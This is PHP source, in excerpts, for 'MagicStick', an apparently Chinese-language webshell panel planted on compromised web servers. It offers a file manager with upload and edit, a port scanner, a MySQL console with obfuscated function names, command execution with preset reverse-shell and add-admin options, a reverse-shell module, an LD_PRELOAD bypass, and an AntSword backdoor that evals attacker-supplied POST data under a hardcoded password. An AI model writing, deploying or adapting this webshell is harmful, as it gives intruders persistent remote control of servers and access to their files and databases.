...
error_reporting(0);
define('PWDPATH', dirname($_SERVER['SCRIPT_FILENAME']));
...
EOF;
    ...
    public function MagicStickLogin()
    {
        self::htmlOut("<html lang='en'><head><title>MagicStick</title>");
        self::loginCss();
        self::htmlOut("</head><body><div class=\"page-container\"><h1>MagicStick-Panel</h1><form method=\"post\"><input type=\"text\" name=\"username\" class=\"username\" placeholder=\"用户名\"><input type=\"password\" name=\"password\" class=\"password\" placeholder=\"密码\"><button type=\"submit\">登录</button></form></div></body>");
    }
...
<div class="main">
    <div class="left">
        <div class="title">MagicStick</div>
        <nav class="nav">
            <ul>
                <li>
                    <a href="?">
                ...
                <li>
                    ...
                    <ul class="sen-nav">
                        <li><a href="?action=portScan">端口扫描</a></li>
                        <li><a href="?action=sysinfo">系统信息</a></li>
                        <li><a href="?action=phpinfo">phpinfo</a></li>
                        <li><a href="?action=antSword">AntSword外连</a></li>
                    </ul>
                </li>
                <li>
                    <a href="?action=fileManage">
                ...
                <li>
                    <a id="more" href="javascript:;" class="havanexta" data-rel="more">
                    ...
                    <ul class="sen-nav">
                        <li><a href="?action=reverShell">反弹shell</a></li>
                        <li><a href="javascript::">等待添加</a></li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;" class="havanexta">
                    ...
                    <ul class="sen-nav">
                        <li><a href="?action=ldLoad">LD_PRELOAD</a></li>
                        <li><a href="javascript::">等待添加</a></li>
                    </ul>
        ...
        (function (j) {
            item[j].onclick = function () {
                ...
                if (nextUl.style.height == '0px' || nextUl.style.height == '') {
                    nextUl.style.height = (nextUl.getElementsByTagName('li').length) * 60 + 'px'
                } else {
...
EOF;
    ...
    public function MagicStickDefault()
    {
        self::htmlMain('<div style="text-align: right"></div>');
    }
...
<div class="layer-tip-box"><div class="title"><span>提示</span><div class="tool"><span>－</span><span>ロ</span><span>×</span></div></div><div class="content">$content</div></div>
EOF;
        self::htmlOut($result);
...
class Main
{
    ...
    public function mainHandler()
    {
        ...
        switch (self::$action) {
            ...
            case 'ldLoad':
                ...
                break;
            case 'portScan':
                self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . Foundation::portScan());
                break;
            case 'antSword':
            ...
            case 'getSword';
                ...
                break;
            default:
                self::$htmlClass->MagicStickDefault();
                break;
        }
    }
    ...
    public function mainLogin()
    {
        if (self::$loginClass->checkCookie()) {
            ...
            self::$htmlClass->MagicStickLogin();
            global $username;
...
<div class="actall">地址<input id='bound_1' type="text" name="bound_1" value="{$target_ip}" style="width:400px"></div>
<div class="actall">端口<input id='bound_2' type="text" name="bound_2" value="{$target_port}" style="width:400px"></div>
<div class="actall">方式<select name="use" >
...
<div class="actall"><input onclick="submitUrl()" type="submit" value="开始" style="width:80px;" class="begin"></div>
</div>
</form>
...
END;
        if ((!empty($GLOBALS['_POST']['bound_1'])) && (!empty($GLOBALS['_POST']['bound_2']))) {
            ...
            if ($GLOBALS['_POST']['use'] == '3') {
                if (!extension_loaded('sockets')) {
                    if ($system == 'WIN') {
                        @dl('php_sockets.dll') or self::$htmlClass->tips("缺少相关模块", '/?action=reverShell');
                    } else {
                        @dl('sockets.so') or self::$htmlClass->tips("缺少模块", '/?action=reverShell');
                    }
                }
                if ($system == "WIN") {
    ...
    public function moneyManage()
    {
        ...
        $ap = 'mys' . 'qli_co' . 'nnent';
        $ao = 'mys' . 'qli_se' . 'lect_db';
        $ai = 'my' . 'sq' . 'li_qu' . 'ery';
        $au = 'my' . 'sq' . 'li_fe' . 'tch_as' . 'soc';
        $ay = 'm' . 'ys' . 'qli_er' . 'ror';

        if ($flag) {
            if ($conn = mysqli_connect($target_host . ':' . $target_port, $target_user, $target_pass)) {
                @$ao($target_name);
            } else {
                self::$htmlClass->tips('连接MYSQL失败', '?action=sqlme');
            }
        }
...
<form method="POST" name="nform" id="nform"><div class="actall"></div><div class="actall">地址 <input id="host" type="text" name="host" value="$target_host" style="width:110px">端口 <input id="port" type="text" name="port" value="$target_port" style="width:110px">用户 <input id="user" type="text" name="user" value="$target_user" style="width:110px">密码 <input id="pass" type="text" name="pass" value="$target_pass" style="width:122px">库名 <input id="data" type="text" name="data" value="$target_name" style="width:110px"></div><div class="actall">
END;
        if (!empty($GLOBALS['_POST']['content'])) {
            $msqls = Decrypt::run($GLOBALS['_POST']['content']);
            $msqls = explode(";", $msqls);
            foreach ($msqls as $msql) {
                if ($sql_result = @$ai($conn, $msql)) {
                    $message = '执行成功<br>';
                    $row = @$au($sql_result);
                    foreach ($row as $val) {
                        $res_return .= ($val . "</br>");
...
END;
        if ($message != '') $result .= "</div><div class=\"actall tip\">$message </div><div class='actall border'>$res_return</div></form>";
        return $result;
    }
...
<div class="main-content"><div class="tip">本模块仅实现centos版64位so文件自动生成，其他请自行补充，将自己编译的so文件命名为libsrc.so放至同目录下可直接调用，C程序源码如下，其他需求请自行修改。</div><form id="pform" method="post" action="?action=ldLoad">
EOF;
...
<form method="POST"name="gform"id="gform"action="?action=rceme"><div class="input-box"><span class="input-text">输入内容</span><input type="text"name="content"id="content"value="{$cmd}"style="width:464px;"><select onchange='return cHandle(options[selectedIndex].value)'><option value="0"selected>内容大全</option><option value="1">查看IP</option><option value="2">查看配置</option><option value="3">查看内核</option><option value="4">复制文件</option><option value="5">查看进程</option><option value="6">添加管理</option><option value="7">用户列表</option><option value="8">查看网络</option><option value="9">查看版本</option><option value="10">编译文件</option><option value="11">更改属性</option><option value="12">bash反弹</option><option value="13">linux反弹</option></select><input type="submit"value="发送"onclick="SubmitUrl();"></div><div class="input-box"><span class="input-text2">返回结果</span><textarea name="show">{$res}</textarea></div></form>
END;
        return $result;
    }
    ...
    public static function DeMarcia($string)
    {
        ...
        if (function_exists($a)) {
            ...
            @pclose($f);
        } else if (substr(PWDPATH, 0, 1) != "/" && class_exists('COM')) {
            $w = new /*-*/ COM($e);
...
END;
        if ((!empty($GLOBALS['_POST']['content'])) && (!empty($GLOBALS['_POST']['method']))) {
            ...
            $method = Decrypt::run($GLOBALS['_POST']['method']);
            $method = StringHandler::trimall($method);
            $method = str_replace("，", ",", $method);
            $ports_array = explode(',', $method);
            foreach ($ports_array as $ports) {
                if (stristr($ports, "-")) {
                    $tmp = explode("-", $ports);

                    try {
                        $portStart = StringHandler::trimall($tmp[0]);
                        $portEnd = StringHandler::trimall($tmp[1]);
                    } catch (Exception $e) {
                        $portStart = "79";
                        $portEnd = "80";
                    }
                    ...
                    $portsFinal_array[] = $ports;
                }
            }

            $ports = [];
            foreach ($portsFinal_array as $value) {
...
<div class="sug-box"><div class="sug-content"><div><div>连接地址：</div><span class="active">$httptype$website$filename?action=getSword&e=cmVfc19ldF9hX2xpX2F2</span></div><div><div>密码：</div><span class="active">just4fun</span></div><div><div>连接配置: </div><span class="active">Cookie:PHPSESSIDS=5dce171e2fab0814d67170153804f937</span></div></div></div>
EOF;
        return $result;
    }
    ...
    public static function sword()
    {
        ...
        $f = $e[2][0] . $e[5][1] . $e[5][0] . $e[4][0];
        @eval($GLOBALS['_POST']['just4fun']);
    }
...
class FileHandler
{
    ...
    public function renameFile()
    {
        ...
        $url = "?action=fileManage&path=" . base64_encode($p_path);
    ...
    public function copyFile()
    {
        ...
        $url = "?action=fileManage&path=" . base64_encode(urlencode(dirname($this->p)));
        HtmlOutput::tips($content, $url);
    }
    ...
    {
        $path = isset($GLOBALS['_GET']['path']) ? urldecode(Decrypt::run($GLOBALS['_GET']['path'])) : PWDPATH . '/';
...
<div class="main-content"><form id='path_form' method='GET'>当前地址: <input type='hidden' name='action' value='fileManage'><input id='path_id' type='text' size='50' name='path' value='$path' width="500px"> <input type='submit' onclick="SubmitPath();" value='转到'> <a href="?action=fileManage" class='mine-file'>文件路径</a> <a href="?action=fileManage&path=$path_2" class="mine-file">上级</a></form><form method='POST' enctype="multipart/form-data" action='?action=editFile&path=$encode_path'><input class="new-file" type="button" value="新建文件" onclick="rusurechk('file.php','?action=editFile&path=$encode_path&type=1&name=');"> <input class="new-file"  type="button" value="新建目录" onclick="rusurechk('dir','?action=editFile&path=$encode_path&type=2&name=');"> <div class="upfile-box">选择文件<input class="new-file upfile"  type="file" name="upfile" value="" text="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; " ></div> <input type="submit" name="upload" value="上传" >
...
EOF;
        ...
        if (!empty($GLOBALS['_POST']['newfile'])) {
            ...
            $url = "?action=fileManage&path=" . base64_encode($this->p);
            HtmlOutput::tips($content, $url);
        }

        $current_user = get_current_user();
        $result .= <<<EOF
</form><form method="POST" name="type" id="fileall" action="?action=fileManage&path=$path_1"><table width="100%" border=0><tr><th>文件路径</th><th>文件属性</th><th>($current_user)用户|组</th><th>修改时间</th><th>文件大小</th><th>操作</th></tr>
EOF;
        while ($dirs = @$dir->read()) {
            ...
            if (is_dir($dirpath)) {
                ...
                $result .= <<<EOF
<tr height="25"><td><input type="checkbox" name="files[]" value="$dirs"><img src="data:image/png;base64,$img_content" border=0> <a href="?action=fileManage&path=$dirpath">$dirs</a></td><td align="center"><a href="?action=perm&path=$dirpath&chmod=$perm">$perm</a></td><td align="center">$dir_owner:$dir_group</td><td align="center">$filetime</td><td align="right"></td><td align="center"><a href="#" onClick="rusurechk('$dirs','?action=rename&path=$dirpath&newname=');return false;" class="change-name">改名</a><a href="#" onClick="rusuredel('$dirs','?action=deldir&path=$dirpath');return false;" class="delete">删除</a><a href="?action=pack&path=$dirpath" class="pack">打包</a></td></tr>
EOF;
                $NUM_D++;
            }
        }
...
EOF;
                if (($it == '.gz') or ($it == 'zip') or ($it == 'tar') or ($it == '.7z'))
                    ...
                    $result .= '<a href="?action=editFile&path=' . $filepath . '&type=3" title="编辑' . $files . '" class="edit">编辑</a>';
...
<form method='POST' id="editor"  action='?action=fileManage&path=$pp'><div class="top-line"><input type="text" name="newfile"  id="newfile" value="$this->p" style="width:550px;">
END;
        $result .= HtmlOutput::htmlSelect(["GB2312" => "GB2312", "UTF-8" => "UTF-8", "BIG5" => "BIG5", "EUC-KR" => "EUC-KR", "EUC-JP" => "EUC-JP", "SHIFT-JIS" => "SHIFT-JIS", "WINDOWS-874" => "WINDOWS-874", "ISO-8859-1" => "ISO-8859-1"], $charset, "onchange=\"window.location='?action=editFile&path=$jspath&type=3&charset='+options[selectedIndex].value;\"");
        $result .= <<<END
指定编码：<input name="charset" id="charset" value="$charset" Type="text" style="width:200px;" onkeydown="if(event.keyCode==13)window.location='?action=editFile&path=$jspath&charset='+this.value;"><input type="button" class="sure" value="确定" onclick="window.location='?action=editFile&path=$jspath&type=3&charset='+this.form.charset.value;"></div><div><textarea name="txt" id="txt" style="width:1100px;height:380px;">$FILE_CODE</textarea></div><div class="tool"><span>文件修改时间</span><input type="text" name="time" id="mtime" value="$FILE_TIME" style="width:200px;"><input type="checkbox" name="bin" value="wb+" size="" checked><span>以二进制形式保存文件(建议使用)</span><div class="btn-box"><input type="button" value="保存" onclick="CheckDate();"> <input name='reset' type='reset' value='重置'><input type="button" value="返回" onclick="window.location='?action=fileManage&path=$pp';"></div></div></form>
END;
        return $result;
    }
...
EOF;
        ...
        if ($GLOBALS['_POST']['class']) {
            ...
            $url = "?action=fileManage&path=" . base64_encode(dirname($this->p));
            HtmlOutput::tips($content, $url);
        }
        $result .= "</form>";
        return $result;
    ...
    public function startUnZip()
    {
        ...
        $zip->close();
        return '解压完毕！&nbsp;&nbsp;&nbsp;<a href="?action=fileManage&path=' . base64_encode(urlencode($to_dir)) . '">进入解压目录</a>&nbsp;&nbsp;&nbsp;<a href="javascript:history.go(-1);">返回</a>';
    }
            ...
            foreach ($show as $files) {
                ...
                if ($file_info['extension'] == $GLOBALS['_POST']['class']) {
                    ...
                    if ($this->scanFile($file_code, $GLOBALS['_POST']['class'])) {
                        ...
                        $result .= <<<EOF
<td>$files</td><td><a class="edit" href="?action=editFile&path=$files_2&type=3">编辑</a></td><td><a class="delete" href="?action=delfile&path=$files_2">删除</a></td></tr></<div></div>
EOF;
                    }
                }
            }
